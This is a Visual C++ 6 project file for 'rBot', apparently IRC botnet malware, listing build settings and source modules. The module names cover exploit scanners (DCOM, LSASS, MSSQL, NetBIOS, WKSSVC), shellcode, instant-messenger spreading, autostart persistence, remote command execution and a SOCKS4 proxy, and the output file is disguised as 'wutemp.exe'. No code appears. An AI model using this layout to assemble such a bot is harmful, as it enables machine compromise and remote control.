# Microsoft Developer Studio Project File - Name="rBot" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=RBOT - WIN32 RELEASE
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "rBot.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "rBot.mak" CFG="RBOT - WIN32 RELEASE"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "rBot - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "rBot - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "rBot - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O1 /I "C:\Program Files\Microsoft SDK\Include" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 user32.lib /nologo /subsystem:windows /incremental:yes /map /debug /machine:I386 /out:"Release/wutemp.exe"
# SUBTRACT LINK32 /pdb:none

!ELSEIF  "$(CFG)" == "rBot - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Ignore_Export_Lib 0
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /MTd /W3 /Gi /GX /Od /I "C:\Program Files\Mircosoft SDK\Include" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /FR /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib wsock32.lib wininet.lib /nologo /subsystem:windows /machine:I386 /align:4096
# SUBTRACT BASE LINK32 /pdb:none
# ADD LINK32 user32.lib /nologo /subsystem:windows /profile /map /debug /machine:I386

!ENDIF 

# Begin Target

# Name "rBot - Win32 Release"
# Name "rBot - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "scanners"

# PROP Default_Filter "cpp"
# Begin Source File

SOURCE=.\dcom.cpp
# End Source File
# Begin Source File

SOURCE=.\dcom2.cpp
# End Source File
# Begin Source File

SOURCE=.\lsass.cpp
# End Source File
# Begin Source File

SOURCE=.\mssql.cpp
# End Source File
# Begin Source File

SOURCE=.\netbios.cpp
# End Source File
# Begin Source File

SOURCE=.\wkssvc.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\advscan.cpp
# End Source File
# Begin Source File

SOURCE=.\aliaslog.cpp
# End Source File
# Begin Source File

SOURCE=.\autostart.cpp
# End Source File
# Begin Source File

SOURCE=.\crc32.cpp
# End Source File
# Begin Source File

SOURCE=.\crypt.cpp
# End Source File
# Begin Source File

SOURCE=.\download.cpp
# End Source File
# Begin Source File

SOURCE=.\driveinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\ehandler.cpp
# End Source File
# Begin Source File

SOURCE=.\fphost.cpp
# End Source File
# Begin Source File

SOURCE=.\ftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\httpd.cpp
# End Source File
# Begin Source File

SOURCE=.\ident.cpp
# End Source File
# Begin Source File

SOURCE=.\imspread.cpp
# End Source File
# Begin Source File

SOURCE=.\irc_send.cpp
# End Source File
# Begin Source File

SOURCE=.\loaddlls.cpp
# End Source File
# Begin Source File

SOURCE=.\misc.cpp
# End Source File
# Begin Source File

SOURCE=.\net.cpp
# End Source File
# Begin Source File

SOURCE=.\netutils.cpp
# End Source File
# Begin Source File

SOURCE=.\processes.cpp
# End Source File
# Begin Source File

SOURCE=.\rBot.cpp
# End Source File
# Begin Source File

SOURCE=.\redirect.cpp
# End Source File
# Begin Source File

SOURCE=.\remotecmd.cpp
# End Source File
# Begin Source File

SOURCE=.\rndnick.cpp
# End Source File
# Begin Source File

SOURCE=.\scan.cpp
# End Source File
# Begin Source File

SOURCE=.\secure.cpp
# End Source File
# Begin Source File

SOURCE=.\session.cpp
# End Source File
# Begin Source File

SOURCE=.\shellcode.cpp
# End Source File
# Begin Source File

SOURCE=.\socks4.cpp
# End Source File
# Begin Source File

SOURCE=.\sysinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\tftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\threads.cpp
# End Source File
# Begin Source File

SOURCE=.\visit.cpp
# End Source File
# Begin Source File

SOURCE=.\wildcard.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=.\advscan.h
# End Source File
# Begin Source File

SOURCE=.\aliaslog.h
# End Source File
# Begin Source File

SOURCE=.\autostart.h
# End Source File
# Begin Source File

SOURCE=.\configs.h
# End Source File
# Begin Source File

SOURCE=.\crc32.h
# End Source File
# Begin Source File

SOURCE=.\crypt.h
# End Source File
# Begin Source File

SOURCE=.\dcom.h
# End Source File
# Begin Source File

SOURCE=.\dcom2.h
# End Source File
# Begin Source File

SOURCE=.\defines.h
# End Source File
# Begin Source File

SOURCE=.\download.h
# End Source File
# Begin Source File

SOURCE=.\driveinfo.h
# End Source File
# Begin Source File

SOURCE=.\ehandler.h
# End Source File
# Begin Source File

SOURCE=.\externs.h
# End Source File
# Begin Source File

SOURCE=.\fphost.h
# End Source File
# Begin Source File

SOURCE=.\ftpd.h
# End Source File
# Begin Source File

SOURCE=.\functions.h
# End Source File
# Begin Source File

SOURCE=.\globals.h
# End Source File
# Begin Source File

SOURCE=.\httpd.h
# End Source File
# Begin Source File

SOURCE=.\ident.h
# End Source File
# Begin Source File

SOURCE=.\imspread.h
# End Source File
# Begin Source File

SOURCE=.\includes.h
# End Source File
# Begin Source File

SOURCE=.\irc_send.h
# End Source File
# Begin Source File

SOURCE=.\loaddlls.h
# End Source File
# Begin Source File

SOURCE=.\misc.h
# End Source File
# Begin Source File

SOURCE=.\mssql.h
# End Source File
# Begin Source File

SOURCE=.\net.h
# End Source File
# Begin Source File

SOURCE=.\netutils.h
# End Source File
# Begin Source File

SOURCE=.\nicklist.h
# End Source File
# Begin Source File

SOURCE=.\passwd.h
# End Source File
# Begin Source File

SOURCE=.\processes.h
# End Source File
# Begin Source File

SOURCE=.\rBot.h
# End Source File
# Begin Source File

SOURCE=.\redirect.h
# End Source File
# Begin Source File

SOURCE=.\remotecmd.h
# End Source File
# Begin Source File

SOURCE=.\rndnick.h
# End Source File
# Begin Source File

SOURCE=.\scan.h
# End Source File
# Begin Source File

SOURCE=.\secure.h
# End Source File
# Begin Source File

SOURCE=.\session.h
# End Source File
# Begin Source File

SOURCE=.\shellcode.h
# End Source File
# Begin Source File

SOURCE=.\socks4.h
# End Source File
# Begin Source File

SOURCE=.\sysinfo.h
# End Source File
# Begin Source File

SOURCE=.\tcpip.h
# End Source File
# Begin Source File

SOURCE=.\tftpd.h
# End Source File
# Begin Source File

SOURCE=.\threads.h
# End Source File
# Begin Source File

SOURCE=.\visit.h
# End Source File
# Begin Source File

SOURCE=.\wildcard.h
# End Source File
# Begin Source File

SOURCE=.\wkssvc.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# End Group
# End Target
# End Project
